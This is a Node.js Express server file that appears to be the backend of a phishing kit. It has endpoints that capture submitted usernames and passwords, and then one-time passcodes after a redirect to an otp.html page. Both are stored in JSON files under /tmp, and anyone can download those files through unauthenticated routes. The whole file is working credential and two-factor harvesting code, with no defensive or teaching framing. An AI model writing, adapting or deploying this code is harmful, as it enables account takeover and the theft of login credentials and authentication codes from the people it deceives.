const express = require('express');
     const cors = require('cors');
     const fs = require('fs').promises;
     const path = require('path');
     const app = express();

     // Middleware
     app.use(cors());
     app.use(express.json());

     // Save credentials
     app.post('/api/credentials', async (req, res) => {
       const { username, password } = req.body;
       if (!username || !password) {
         return res.status(400).json({ error: 'Missing username or password' });
       }
       const data = { username, password, timestamp: new Date().toISOString() };
       const filePath = path.join('/tmp', 'credentials.json');

       try {
         let credentials = [];
         try {
           const fileData = await fs.readFile(filePath, 'utf8');
           credentials = JSON.parse(fileData);
         } catch (error) {
           if (error.code !== 'ENOENT') throw error;
         }
         credentials.push(data);
         await fs.writeFile(filePath, JSON.stringify(credentials, null, 2));
         res.json({ success: true, redirect: `/otp.html?username=${encodeURIComponent(username)}` });
       } catch (error) {
         console.error(error);
         res.status(500).json({ error: 'Server error' });
       }
     });

     // Save OTP
     app.post('/api/otp', async (req, res) => {
       const { username, otp } = req.body;
       if (!username || !otp) {
         return res.status(400).json({ error: 'Missing username or OTP' });
       }
       const data = { username, otp, timestamp: new Date().toISOString() };
       const filePath = path.join('/tmp', 'otp.json');

       try {
         let otps = [];
         try {
           const fileData = await fs.readFile(filePath, 'utf8');
           otps = JSON.parse(fileData);
         } catch (error) {
           if (error.code !== 'ENOENT') throw error;
         }
         otps.push(data);
         await fs.writeFile(filePath, JSON.stringify(otps, null, 2));
         res.json({ success: true });
       } catch (error) {
         console.error(error);
         res.status(500).json({ error: 'Server error' });
       }
     });

     // Download credentials
     app.get('/api/credentials-file', async (req, res) => {
       const filePath = path.join('/tmp', 'credentials.json');
       try {
         const data = await fs.readFile(filePath, 'utf8');
         res.setHeader('Content-Type', 'application/json');
         res.setHeader('Content-Disposition', 'attachment; filename=credentials.json');
         res.send(data);
       } catch (error) {
         res.status(500).send('Error downloading file');
       }
     });

     // Download OTPs
     app.get('/api/otp-file', async (req, res) => {
       const filePath = path.join('/tmp', 'otp.json');
       try {
         const data = await fs.readFile(filePath, 'utf8');
         res.setHeader('Content-Type', 'application/json');
         res.setHeader('Content-Disposition', 'attachment; filename=otp.json');
         res.send(data);
       } catch (error) {
         res.status(500).send('Error downloading file');
       }
     });

     module.exports = app;